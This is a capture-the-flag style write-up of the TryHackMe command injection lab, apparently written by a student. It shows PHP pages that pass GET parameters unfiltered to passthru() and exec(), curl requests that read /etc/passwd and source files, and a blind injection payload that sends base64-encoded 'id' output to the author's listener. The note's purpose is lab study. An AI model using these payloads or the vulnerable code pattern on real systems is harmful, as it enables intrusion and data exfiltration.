# 01. Command injection practical


[Part 1. Before we start]

The passthru() function is similar to the exec() function in that it executes a command. This function should be used in place of exec() or system() 

[Part 2. Command injection]

Target: http://10.10.27.205/evilshell.php

My TryHackMe IP address using openvpn is: 10.4.65.8

- In file evilshell.php:

```php
if (isset($_GET["commandString"])) {
// var get value from param commandString 
    $command_string = $_GET["commandString"];
                        
    try {
//[?] execute the command 
        passthru($command_string);
    } catch (Error $error) {
        echo "<p class=mt-3><b>$error</b></p>";
    }
}
```

- pwd && lsb_release -a  shows that we are in the dir /var/www/html of ubuntu os

```
/var/www/html 
Distributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic 
```

1) What strange text file is in the website root directory?

- Firstly, we use ls to list all files or folders in the dir:

```
// we can see the file drpepper.txt right because it's the only txt file here 
css drpepper.txt evilshell.php index.php js 
```

- cat drpepper.txt: I love Dr Pepper

**Result:** drpepper.txt

2)  How many non-root/non-service/non-daemon users are there?

- In this case, we can cat /etc/passwd to show all users

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
........
lxd:x:105:65534::/var/lib/lxd/:/bin/false
........
```

- In this case, we only have root user as root:x:0:0:root:/root:/bin/bash and service user as www-data and lxd. The others user are daemon users

**Result:** 0 non-root/non-service/non-daemon users

[Explaination] What are root/service/daemon users ?

a) Root User (Superuser or Administrator):

- Username: **`root`** (or sometimes **`administrator`** on certain systems)
- UID (User ID): 0
- The root user has superuser or administrative privileges. It has unrestricted access to all files and commands on the system ⇒ this is why we always sudo before the command in linux for get the full provileges

For example: root:x:0:0:root:/root:/bin/bash

b) Service Users:

- These are dedicated user accounts created for specific services or applications running on the system, which includes users like **`www-data`** (used by web servers), **`mysql`** (used by MySQL database server), **`postgres`** (used by PostgreSQL database server), etc.
- They usually have restricted access to the system.

For example: www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

c) Daemon Users:

- Daemons are background processes that perform various tasks or services in the operating system.
- Examples include users like **`daemon`**, **`sshd`** (used by the SSH server), and **`syslog`** (used by the system logging daemon).

3) What user is this app running as?

whoami ⇒ www-data

4) What is the user's shell set as?

- Check the file etc/passwd above

**Result:** /usr/sbin/nologin

5) What version of Ubuntu is running?

- We have solved this above right!
- The command:  lsb_release -a

**Result:** 18.04.4

6) Print out the MOTD.  What favorite beverage is shown?

[Hint for us]

- 00-header
- On Linux and Unix-based systems, the MOTD is usually stored in a text file, often located at **`/etc/motd`** or **`/etc/update-motd.d/`**. The contents of this file are displayed to users upon login.

[Try to exploit]

- Firstly, i try cat /etc/motd or cat cat /etc/update-motd.d but nothing happens
- Next, next i try to cd to /etc and list all files and folders to check if there is any files that we need and curl to search keyword otd : cd /etc; ls

```
       
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.27.205/evilshell.php?commandString=cd+%2Fetc%3B+ls
<!doctype html>
<html lang="en">

........
         <button type="submit" class="btn btn-primary w-100">Submit</button>
NetworkManager
......
//[*] This is the file we need to check
update-motd.d
update-notifier
updatedb.config
 .......
</html>  
```

- But we cat unsuccessfully. So maybe this is a folder not a file right !
- Now we try the command `cd /etc/update-motd.d ; ls` and it works

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.27.205/evilshell.php?commandString=cd+%2Fetc%2Fupdate-motd.d+%3B+ls                                                                     
<!doctype html>
<html lang="en">
                    <button type="submit" class="btn btn-primary w-100">Submit</button>
00-header //[*] This the hint that tryhackme shows us right!
10-help-text
50-landscape-sysinfo
50-motd-news
80-esm
   ......
</html> 
```

- Now we just to cat the file: cat /etc/update-motd.d/00-header

```
#!/bin/sh
#
.......
[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

DR PEPPER MAKES THE WORLD TASTE BETTER!  

```

**Result:** DR PEPPER

[Part 3. Get full source code]

*) This the technique of my teacher shows me to get the full source code and build the lab by ourselves

- Firstly, we ls to see all files:

```
css drpepper.txt evilshell.php index.php js
//[?] there is a file called index.php. But what is it used for ?  
```

- Now we only need to ctrl + u to get the all files in folder js and css
- For server side script like php, we have to cat the file evilshell.php and curl because cat the file will run the source code of file evilshell.php on front-end

```
──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.27.205/evilshell.php?commandString=cat+evilshell.php                     
//[?] the source code is after button tag 
                    <button type="submit" class="btn btn-primary w-100">Submit</button>
<!doctype html>
<html lang="en">
......

<body>
    <div class="container" id="glass">
        <div class="align-items-center justify-content-center row" style="min-height: 100vh;">
            <div class="col-sm-6 text-center">
                <form action="" method="get">
                    <h4 class="display-4">EvilShell</h4>
                    <div class="form-group">
                        <input type="text" name="commandString" class="form-control" id="commandString"
                            placeholder="Enter command..."> 
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Submit</button>
                    <?php

                    if (isset($_GET["commandString"])) {
                        $command_string = $_GET["commandString"];
                        
                        try {
                            passthru($command_string);
                        } catch (Error $error) {
                            echo "<p class=mt-3><b>$error</b></p>";
                        }
                    }
                        
                ?>
                </form>
            </div>
        </div>
    </div>
</body>
```

- Create the dir the same as the lab and run command: php -S localhost:8888

[Part 4. Easter egg]

- As part 3, i stll wonder what is index.php, so i try to access this file

```
──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.27.205/index.php                                    
....
<form action="" method="get">
             <h4 class="display-4">Directory Search</h4>
  <div class="form-group">
      <input type="text" name="username" class="form-control" id="username"
            placeholder="Search user..." required> 
   </div>
       <button type="submit" class="btn btn-primary w-100">Submit</button>
</form>
....     
//It has the same form as evilshell.php but change <h4> to Directory Seach                           
```

- Now i run the command but it shows that  ‘Error! User ls was not found on the system’, which means that we can not run command as normal like evilshell.php
- Go back to file eveilshell.php and get the source code of the file:

```php
if (isset($_GET["username"])) {
// var get value from param username 
    $username = $_GET["username"];
//  extract the usernames from the /etc/passwd file                    
    $command = "awk -F: '{print $1}' /etc/passwd | grep $username";
// execute the command 
    $returned_user = exec($command);
    if ($returned_user == "") {
        $result = "<div class='alert alert-danger' role='alert'>
        <strong>Error!</strong> User <b>$username</b> was not found on the <b>system</b>
        </div>";
    } else {
        $result = "<div class='alert alert-success' role='alert'>
        <strong>Success!</strong> User <b>$username</b> was found on the <b>system</b>
        </div>";
     }

      echo $result;
 }
```

- There is no filter at all. We just need to use “;” to close the previous command

[?] The next problem is that it only shows like  Success! User ; pwd was found on the system. So we come up with technique reverse shell initially. 

- Open http.server with port 5000 to listen to the request on this port

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 5000

Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
```

- Now we just need to curl to send request to our ip in tryhackme network with specific port. However, we need to encode base64 to send full data
- The payload: ; curl 10.4.65.8:5000/$(id | base64)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 5000

Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
10.10.27.205 - - [24/Feb/2024 23:47:04] code 404, message File not found
10.10.27.205 - - [24/Feb/2024 23:47:04] "GET /uid=33(www-data) HTTP/1.1" 404 -
10.10.27.205 - - [24/Feb/2024 23:49:41] code 404, message File not found
10.10.27.205 - - [24/Feb/2024 23:49:41] "GET /dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK HTTP/1.1" 404 -

```

**Final result:** dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK ⇒ 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
